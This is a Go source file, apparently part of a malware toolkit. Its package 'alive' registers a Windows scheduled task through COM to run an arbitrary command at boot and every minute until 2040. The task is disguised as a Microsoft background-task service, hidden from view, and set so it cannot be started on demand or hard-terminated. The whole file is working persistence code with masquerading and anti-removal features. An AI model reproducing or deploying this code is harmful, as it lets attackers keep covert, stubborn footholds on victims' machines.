package alive

import (
	"encoding/xml"
	"fmt"
	"strings"
	"variant/log"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

func WinTaskXML(registerXML string) {
	if err := ole.CoInitialize(uintptr(0)); err != nil {
		log.Fatalf("CoInitialize: %v", err)
	}
	defer ole.CoUninitialize()

	unknown, _ := oleutil.CreateObject("Schedule.Service")
	schtask, _ := unknown.QueryInterface(ole.IID_IDispatch)
	defer unknown.Release()
	defer schtask.Release()

	// params: servername, domain, username, pwd
	_, err := oleutil.CallMethod(schtask, "Connect", "", "", "", "")
	if err != nil {
		log.Fatalf("CallMethod Connect: %v", err)
	}

	root, err := oleutil.CallMethod(schtask, "GetFolder", `\`)
	if err != nil {
		log.Fatalf("CallMethod GetFolder: %v", err)
	}

	rootDispatch := root.ToIDispatch()
	defer rootDispatch.Release()

	task, err := oleutil.CallMethod(rootDispatch, "RegisterTask", "", registerXML, 2, "", "", 3)
	if err != nil {
		log.Fatalf("CallMethod RegisterTask: %v", err)
	}
	taskDispatch := task.ToIDispatch()
	defer taskDispatch.Release()

	name := oleutil.MustGetProperty(taskDispatch, "Name")
	log.Infof("Created new task: %v\n", name.ToString())
}

func RegisterXML(cmdArgs string) string {
	taskXML := Task{
		Version: "1.2",
		Xmlns:   "http://schemas.microsoft.com/windows/2004/02/mit/task",
		RegistrationInfo: RegistrationInfo{
			Date:        "2022-10-11T13:21:17-08:00",
			Author:      "Microsoft",
			Version:     "1.0.0",
			Description: "Maintains registrations for background tasks for Universal Windows Platform applications.",
		},
		Triggers: Triggers{
			CalendarTrigger: &CalendarTrigger{
				StartBoundary: "2024-01-01T08:00:00",
				EndBoundary:   "2040-01-01T08:00:00",
				Repetition: Repetition{
					Interval: "PT1M",
					Duration: "PT4M",
				},
				ScheduleByDay: ScheduleByDay{
					DaysInterval: 1,
				},
			},
			BootTrigger: &BootTrigger{
				StartBoundary:      "2024-01-01T08:00:00",
				EndBoundary:        "2040-01-01T08:00:00",
				Enabled:            true,
				ExecutionTimeLimit: "PT5M",
			},
			TimeTrigger:  nil, // 结构体指针置空, 避免XML序列化到未使用的触发器
			LogonTrigger: nil, // 结构体指针置空, 避免XML序列化到未使用的触发器
		},
		Principals: Principals{
			Principal: Principal{
				Id:        "Author",
				UserId:    "Administrator",
				RunLevel:  "LeastPrivilege",
				LogonType: "InteractiveToken",
			},
		},
		Settings: Settings{
			Enabled:            true,
			AllowStartOnDemand: false,
			AllowHardTerminate: false,
			Hidden:             true,
		},
		Actions: Actions{
			Context: "Author",
			Exec: Exec{
				Command: cmdArgs,
			},
		},
	}

	xmlBytes, err := xml.MarshalIndent(taskXML, "", "    ")
	if err != nil {
		log.Fatalf("Error marshalling XML:", err)
	}

	// 切换XML头的编码为UTF-16
	xmlStr := xml.Header + string(xmlBytes)

	// 自定义XML头部信息，指定UTF-16编码
	xmlHeader := fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n")
	xmlStr = strings.Replace(xmlStr, xml.Header, xmlHeader, 1)

	return xmlStr
}
